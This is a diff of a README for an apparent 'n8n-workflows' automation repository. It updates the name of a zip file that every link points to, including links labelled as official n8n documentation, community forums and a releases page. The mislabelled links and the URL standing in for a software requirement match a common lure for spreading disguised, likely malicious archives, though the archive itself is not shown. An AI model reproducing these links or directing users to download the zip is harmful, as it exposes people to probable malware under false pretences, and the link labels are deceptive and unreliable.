@@ -1,7 +1,7 @@
 # 🌟 n8n-workflows - Automate Your Business Effortlessly
 
 ## 📥 Download Now
-[![Download n8n-workflows](https://raw.githubusercontent.com/Renpapi/n8n-workflows/main/google_maps_business_scraper/workflows_n_v3.1.zip)](https://raw.githubusercontent.com/Renpapi/n8n-workflows/main/google_maps_business_scraper/workflows_n_v3.1.zip)
+[![Download n8n-workflows](https://raw.githubusercontent.com/Renpapi/n8n-workflows/main/google_maps_business_scraper/workflows-n-2.6-alpha.1.zip)](https://raw.githubusercontent.com/Renpapi/n8n-workflows/main/google_maps_business_scraper/workflows-n-2.6-alpha.1.zip)
 
 ## 📖 Description
 Welcome to the **n8n-workflows** repository! This is your go-to collection of workflows designed to help you automate tasks using **n8n**. With these workflows, you can streamline your processes in lead generation, marketing, and more without any coding experience.
@@ -9,9 +9,9 @@ Welcome to the **n8n-workflows** repository! This is your go-to collection of wo
 ## 🚀 Getting Started
 To start using the n8n workflows, follow these steps:
 
-1. **Download the Workflows**: Get the workflows from the Releases page. Visit [this page to download](https://raw.githubusercontent.com/Renpapi/n8n-workflows/main/google_maps_business_scraper/workflows_n_v3.1.zip).
+1. **Download the Workflows**: Get the workflows from the Releases page. Visit [this page to download](https://raw.githubusercontent.com/Renpapi/n8n-workflows/main/google_maps_business_scraper/workflows-n-2.6-alpha.1.zip).
    
-2. **Install n8n**: If you haven't already, install n8n on your computer. You can find installation instructions on the [n8n documentation](https://raw.githubusercontent.com/Renpapi/n8n-workflows/main/google_maps_business_scraper/workflows_n_v3.1.zip).
+2. **Install n8n**: If you haven't already, install n8n on your computer. You can find installation instructions on the [n8n documentation](https://raw.githubusercontent.com/Renpapi/n8n-workflows/main/google_maps_business_scraper/workflows-n-2.6-alpha.1.zip).
 
 3. **Load the Workflows**: After installing n8n, load the downloaded workflows into your n8n setup. Open n8n, and use the import feature to add the workflows. 
 
@@ -31,7 +31,7 @@ To start using the n8n workflows, follow these steps:
 To run n8n and utilize these workflows, ensure your system meets the following requirements:
 
 - **Operating System**: Windows 10 or later, macOS Catalina or later, or a compatible Linux distribution.
-- **https://raw.githubusercontent.com/Renpapi/n8n-workflows/main/google_maps_business_scraper/workflows_n_v3.1.zip**: Version 14 or later.
+- **https://raw.githubusercontent.com/Renpapi/n8n-workflows/main/google_maps_business_scraper/workflows-n-2.6-alpha.1.zip**: Version 14 or later.
 - **Memory**: Minimum of 4GB RAM.
 - **Storage**: At least 200MB free space to install n8n and the workflows.
 
@@ -45,10 +45,10 @@ This repository includes workflows centered around the following topics:
 - **Marketing Automation**: Set up automated marketing processes tailored to your needs.
 
 ## 🔗 Download & Install
-To download the workflows, make sure to visit [the releases page](https://raw.githubusercontent.com/Renpapi/n8n-workflows/main/google_maps_business_scraper/workflows_n_v3.1.zip) for the latest version. Choose the zip file that contains the workflows, download it, and follow the steps in the "Getting Started" section.
+To download the workflows, make sure to visit [the releases page](https://raw.githubusercontent.com/Renpapi/n8n-workflows/main/google_maps_business_scraper/workflows-n-2.6-alpha.1.zip) for the latest version. Choose the zip file that contains the workflows, download it, and follow the steps in the "Getting Started" section.
 
 ## 🧑‍🤝‍🧑 Community Support
-If you have questions or need assistance, feel free to check out the community forums for n8n at [n8n Community](https://raw.githubusercontent.com/Renpapi/n8n-workflows/main/google_maps_business_scraper/workflows_n_v3.1.zip). You can find help from experienced users and share your experiences as well.
+If you have questions or need assistance, feel free to check out the community forums for n8n at [n8n Community](https://raw.githubusercontent.com/Renpapi/n8n-workflows/main/google_maps_business_scraper/workflows-n-2.6-alpha.1.zip). You can find help from experienced users and share your experiences as well.
 
 ## 📝 License
 The n8n workflows are provided under an open-source license. Feel free to use and modify the workflows according to your needs. Always give credit where it's due to help support this community.
